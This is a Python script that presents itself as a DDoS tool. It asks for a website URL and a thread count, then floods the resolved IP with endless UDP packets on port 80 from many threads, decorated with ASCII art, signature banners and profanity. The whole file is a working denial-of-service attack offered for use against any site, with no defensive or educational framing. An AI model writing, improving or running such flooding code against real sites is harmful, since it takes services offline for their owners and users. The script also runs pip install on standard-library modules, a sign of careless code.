import os
import sys
os.system("pip install time")
os.system("pip install socket")
os.system("pip install _thread")
import time
import socket
import _thread

print(f'\033[31m')
from time import sleep
x = ("""

_____Sexy?Sex
 ____?Sexy?Sexy
 ___y?Sexy?Sexy?
 ___?Sexy?Sexy?S
 ___?Sexy?Sexy?S
 __?Sexy?Sexy?Se
 _?Sexy?Sexy?Se
 _?Sexy?Sexy?Se
 _?Sexy?Sexy?Sexy?
 ?Sexy?Sexy?Sexy?Sexy
 ?Sexy?Sexy?Sexy?Sexy?Se
 ?Sexy?Sexy?Sexy?Sexy?Sex
 _?Sexy?__?Sexy?Sexy?Sex
 ___?Sex____?Sexy?Sexy?
 ___?Sex_____?Sexy?Sexy
 ___?Sex_____?Sexy?Sexy
 ____?Sex____?Sexy?Sexy
 _____?Se____?Sexy?Sex
 ______?Se__?Sexy?Sexy
 _______?Sexy?Sexy?Sex
 ________?Sexy?Sexy?sex
 _______?Sexy?Sexy?Sexy?Se
 _______?Sexy?Sexy?Sexy?Sexy?
 _______?Sexy?Sexy?Sexy?Sexy?Sexy
 _______?Sexy?Sexy?Sexy?Sexy?Sexy?S
 ________?Sexy?Sexy____?Sexy?Sexy?se
 _________?Sexy?Se_______?Sexy?Sexy?
 _________?Sexy?Se_____?Sexy?Sexy?
 _________?Sexy?S____?Sexy?Sexy
 _________?Sexy?S_?Sexy?Sexy
 ________?Sexy?Sexy?Sexy
 ________?Sexy?Sexy?S
 ________?Sexy?Sexy
 _______?Sexy?Se
 _______?Sexy?                                         SHAH_EBLIS THE GOT
 ______?Sexy?                                           GOD IS CYBER/FIL
 ______?Sexy?                                         I LOVE YOU AMIR_REZA 
 ______?Sexy?
 ______?Sexy
 ______?Sexy
 _______?Sex
 _______?Sex
 _______?Sex
 ______?Sexy
 ______?Sexy
 _______Sexy
 _______ Sexy?
 ________SexY
 

		""")
for CoursNight in x :
	sleep(0.002)
	print(CoursNight,end='' ,flush=True)


x = '\033[32m'
print(x,'ddos = SHAH EBLIS  GOD MAJAZY ',x)
print(f'\033[39m')
site = input("Enter your site url => ")
thread_count = input("Enter your thread => ")
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'virus32'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(f'\033[32m')
        print("FACKE YOU",site," = ",ip,"     SHAH EBLIS GOD")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass